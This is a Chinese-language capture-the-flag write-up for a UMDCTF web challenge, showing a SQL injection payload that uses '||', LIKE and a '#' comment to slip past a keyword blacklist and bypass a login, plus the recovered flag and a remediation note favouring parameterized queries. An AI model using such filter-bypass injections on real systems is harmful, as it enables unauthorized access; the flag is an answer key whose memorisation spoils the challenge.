# Houston Astros' Sign Stealing Software - Part 1

## 题目简述

登录接口把用户名和密码直接拼接进 SQL。虽然代码屏蔽了 `or`、`and`、`union`、`select` 等单词，并要求输入至少包含字母、数字或 `%`，但没有阻止引号、`||`、`LIKE` 和注释符。

## 解题过程

服务端查询为：

```sql
SELECT username, pass
FROM users
WHERE username = '$username' AND pass = '$password';
```

可以让用户名条件匹配以赛事前缀开头的特殊账户，并注释掉密码部分：

```text
username: ' || username like 'UMDCTF-%' #
password: x
```

拼接后关键条件成为：

```sql
username = '' || username LIKE 'UMDCTF-%'
```

它没有出现被过滤的 `or` 单词。数据库中的命中行把 flag 拆在两列：

```text
username = UMDCTF-{
pass     = Y0u_Ar3_N0W_St341Ng_S1gns_Fr0m_Astr05}
```

合并得到：

```text
UMDCTF-{Y0u_Ar3_N0W_St341Ng_S1gns_Fr0m_Astr05}
```

数据库初始化脚本和查询返回字段对该结果相互印证；README 中的哈希与实际部署数据不一致。

## 方法总结

关键字黑名单无法覆盖 SQL 的等价语法，也无法修复字符串拼接的根因。应使用参数化查询，并在认证成功后只返回必要字段；本题还说明敏感值拆成两列并不能阻止一次查询同时泄露。
